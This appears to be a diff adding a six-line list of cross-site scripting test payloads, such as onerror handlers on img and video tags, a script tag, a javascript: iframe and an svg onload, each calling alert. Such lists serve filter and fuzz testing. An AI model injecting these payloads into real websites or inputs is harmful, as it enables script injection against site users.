@@ -1,0 +1,6 @@
+<img src/onerror=alert(1)>
+<image src/onerror=alert(1)>
+<video src/onerror=alert(1)>
+<script>alert(1)</script>
+<iframe src="javascript:alert('XSS');"></iframe>
+<svg onload=alert(1)>
